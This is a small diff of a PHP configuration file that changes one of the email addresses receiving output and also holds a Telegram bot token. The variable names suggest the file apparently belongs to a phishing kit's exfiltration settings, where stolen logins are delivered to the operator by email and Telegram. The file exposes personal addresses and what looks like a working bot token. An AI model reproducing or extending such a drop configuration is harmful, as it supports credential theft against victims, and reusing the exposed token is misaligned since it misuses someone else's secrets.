@@ -1,6 +1,6 @@
 <?php 
 // Email configuration
-$Receive_email="raymondunknow@proton.me,plakisina.y.s@gmail.com";
+$Receive_email="raymondunknow@proton.me,smartdemboiz@protonmail.com";
 
 // Telegram configuration
 $telegram_bot_token = '5637971673:AAEahOWFFD_LZIHhkZg4bO7lbgo95vTAfcA'; // Your bot token
